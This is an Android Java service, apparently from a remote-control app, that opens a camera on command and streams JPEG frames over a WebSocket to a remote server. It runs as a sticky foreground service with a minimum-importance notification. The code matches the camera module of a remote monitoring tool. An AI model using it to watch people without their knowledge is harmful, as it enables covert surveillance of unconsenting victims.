package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import androidx.core.app.ServiceCompat;

import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;
import com.xrc.system.ui.MainActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraService extends Service {
    private static final String TAG = Constants.TAG + ":CamSvc";
    private static final String CAM_CHANNEL = Constants.CHANNEL_ID + "_cam";
    private static final int MAX_WIDTH = 640;
    private static final int MAX_HEIGHT = 480;
    private static final int FGS_TYPE_CAMERA = 1 << 1;
    private CameraManager cm;
    private CameraDevice camera;
    private ImageReader imageReader;
    private HandlerThread bgThread;
    private Handler bgHandler;
    private String cameraId = "0";

    @Override
    public void onCreate() {
        super.onCreate();
        cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        bgThread = new HandlerThread("CameraBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            cameraId = intent.getStringExtra("camera");
            if (cameraId == null) cameraId = "0";
        }
        createNotificationChannel();
        ServiceCompat.startForeground(this, Constants.NOTIF_ID_CAMERA, buildNotification(), FGS_TYPE_CAMERA);
        openCamera();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        closeCamera();
        if (bgThread != null) {
            bgThread.quitSafely();
        }
        super.onDestroy();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CAM_CHANNEL, "Camera",
                    NotificationManager.IMPORTANCE_MIN);
            ch.setDescription("Camera streaming");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, CAM_CHANNEL)
                .setContentTitle("Camera Service")
                .setContentText("Streaming active")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void openCamera() {
        try {
            if (cm == null) return;
            String[] ids = cm.getCameraIdList();
            if (ids.length == 0) {
                Log.e(TAG, "No cameras available");
                return;
            }
            boolean found = false;
            for (String id : ids) {
                if (id.equals(cameraId)) {
                    found = true;
                    break;
                }
            }
            if (!found) cameraId = ids[0];

            CameraCharacteristics chars = cm.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) {
                Log.e(TAG, "No stream config map");
                return;
            }
            Size[] sizes = map.getOutputSizes(ImageFormat.YUV_420_888);
            if (sizes == null || sizes.length == 0) {
                Log.e(TAG, "No output sizes");
                return;
            }
            Size bestSize = getBestSize(sizes);
            imageReader = ImageReader.newInstance(bestSize.getWidth(), bestSize.getHeight(),
                    ImageFormat.YUV_420_888, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                try (Image img = reader.acquireLatestImage()) {
                    if (img != null) processImage(img);
                }
            }, bgHandler);

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    camera = device;
                    createSession();
                }
                @Override public void onDisconnected(CameraDevice device) { closeCamera(); }
                @Override public void onError(CameraDevice device, int error) {
                    Log.e(TAG, "Camera error: " + error);
                    closeCamera();
                }
            }, bgHandler);
        } catch (CameraAccessException | SecurityException e) {
            Log.e(TAG, "Open camera failed", e);
        }
    }

    private Size getBestSize(Size[] sizes) {
        Size best = sizes[0];
        for (Size s : sizes) {
            if (s.getWidth() <= MAX_WIDTH && s.getHeight() <= MAX_HEIGHT) {
                if (s.getWidth() > best.getWidth() || s.getHeight() > best.getHeight()) {
                    best = s;
                }
            }
        }
        return best;
    }

    private void createSession() {
        try {
            if (camera == null || imageReader == null) return;
            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            builder.addTarget(imageReader.getSurface());
            camera.createCaptureSession(Collections.singletonList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession session) {
                            try {
                                session.setRepeatingRequest(builder.build(), null, bgHandler);
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Capture failed", e);
                            }
                        }
                        @Override public void onConfigureFailed(CameraCaptureSession session) {
                            Log.e(TAG, "Session config failed");
                        }
                    }, bgHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Session creation failed", e);
        }
    }

    private void processImage(Image image) {
        try {
            byte[] nv21 = yuv420888ToNv21(image);
            YuvImage yuv = new YuvImage(nv21, ImageFormat.NV21,
                    image.getWidth(), image.getHeight(), null);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            yuv.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 60, out);
            byte[] jpeg = out.toByteArray();
            String b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP);

            JSONObject data = new JSONObject();
            data.put("frame", b64);
            data.put("w", image.getWidth());
            data.put("h", image.getHeight());
            XRCWebSocketClient.get(this).sendEvent("camera_frame", data);
        } catch (Exception e) {
            Log.e(TAG, "Process image failed", e);
        }
    }

    private byte[] yuv420888ToNv21(Image image) {
        ByteBuffer yBuffer = image.getPlanes()[0].getBuffer();
        ByteBuffer uBuffer = image.getPlanes()[1].getBuffer();
        ByteBuffer vBuffer = image.getPlanes()[2].getBuffer();

        int width = image.getWidth();
        int height = image.getHeight();
        int ySize = yBuffer.remaining();
        int uvHeight = height / 2;
        int uvWidth = width / 2;
        int uvRowStride = image.getPlanes()[1].getRowStride();
        int uvPixelStride = image.getPlanes()[1].getPixelStride();

        byte[] nv21 = new byte[width * height * 3 / 2];

        yBuffer.get(nv21, 0, ySize);

        int pos = ySize;
        for (int row = 0; row < uvHeight; row++) {
            for (int col = 0; col < uvWidth; col++) {
                int uvOffset = row * uvRowStride + col * uvPixelStride;
                nv21[pos++] = vBuffer.get(uvOffset);
                nv21[pos++] = uBuffer.get(uvOffset);
            }
        }

        return nv21;
    }

    private void closeCamera() {
        if (camera != null) {
            camera.close();
            camera = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
}
